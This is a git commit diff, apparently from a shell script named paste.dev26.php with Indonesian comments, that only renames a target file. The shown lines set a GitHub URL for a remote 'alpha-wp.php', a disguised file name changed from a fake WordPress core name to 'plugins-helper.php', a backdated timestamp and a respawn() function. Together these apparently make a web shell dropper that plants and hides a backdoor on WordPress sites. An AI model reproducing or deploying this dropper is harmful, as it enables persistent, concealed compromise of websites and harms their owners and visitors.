f97de63b5c6ec4162f1913b8db29416f8483b400
onlyme1d <agungrikardo09@gmail.com>
2025-12-01 13:59:27 +0700

    Update and rename paste.dev25.php to paste.dev26.php

--- paste.dev26.php
+++ paste.dev26.php
@@ -42,7 +42,7 @@ respawn() {
 
 # URL sumber file yang akan diunduh
 url="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/alpha-wp.php"
-file_name="class-wp-customize-old-menu-section.php"
+file_name="plugins-helper.php"
 timestamp="201201081531.12"
 
 # Jalankan fungsi penting
